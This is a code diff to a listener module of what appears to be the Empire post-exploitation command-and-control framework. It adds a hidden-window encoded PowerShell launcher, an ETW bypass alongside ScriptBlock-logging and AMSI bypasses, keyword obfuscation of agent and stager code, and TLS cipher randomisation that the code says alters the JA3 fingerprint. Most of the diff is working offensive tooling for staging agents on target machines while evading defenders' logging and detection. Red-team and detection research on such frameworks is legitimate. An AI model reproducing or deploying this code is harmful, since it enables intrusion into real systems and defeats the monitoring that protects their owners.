@@ -9,6 +9,7 @@ import ssl
 import time
 import copy
 import sys
+import threading
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
 
@@ -18,6 +19,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 
 class Listener(object):
@@ -60,6 +62,11 @@ class Listener(object):
                 'Description'   :   'Port for the listener.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'Launcher': {
+                'Description': 'Launcher string.',
+                'Required': True,
+                'Value': 'powershell -noP -sta -w 1 -enc '
             },
             'StagingKey' : {
                 'Description'   :   'Staging key for initial agent negotiation.',
@@ -116,15 +123,10 @@ class Listener(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'SlackToken' : {
-                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+            'SlackURL' : {
+                'Description'   :   'Your Slack Incoming Webhook URL to communicate with your Slack instance.',
                 'Required'      :   False,
                 'Value'         :   ''
-            },
-            'SlackChannel' : {
-                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
-                'Required'      :   False,
-                'Value'         :   '#general'
             }
         }
 
@@ -170,7 +172,7 @@ class Listener(object):
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -185,6 +187,7 @@ class Listener(object):
             host = listenerOptions['Host']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
+            launcher = listenerOptions['Launcher']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
 
@@ -197,6 +200,8 @@ class Listener(object):
                     # ScriptBlock Logging bypass
                     if scriptLogBypass:
                         stager += bypasses.scriptBlockLogBypass()
+                    if ETWBypass:
+                        stager += bypasses.ETWBypass()
                     # @mattifestation's AMSI bypass
                     if AMSIBypass:
                         stager += bypasses.AMSIBypass()
@@ -247,6 +252,7 @@ class Listener(object):
 
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
+
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -282,6 +288,9 @@ class Listener(object):
             f = open("%s/data/agent/stagers/http_mapi.ps1" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            stager = helpers.keyword_obfuscation(stager)
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -341,9 +350,12 @@ class Listener(object):
 
         if language == 'powershell':
 
-            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             code = f.read()
             f.close()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            code = helpers.keyword_obfuscation(code)
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -590,7 +602,7 @@ class Listener(object):
             #   NOTE: this can also go into a cookie/etc.
 
             dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, request.get_data(), listenerOptions, clientIP)
-            #print dataResults
+
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
                     if results:
@@ -639,7 +651,7 @@ class Listener(object):
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 # setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
                 # it every time the listener is launched
-                ipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
+                cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
                              "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
                 selectciph = random.choice(cipherlist)
                 context.set_ciphers(selectciph)
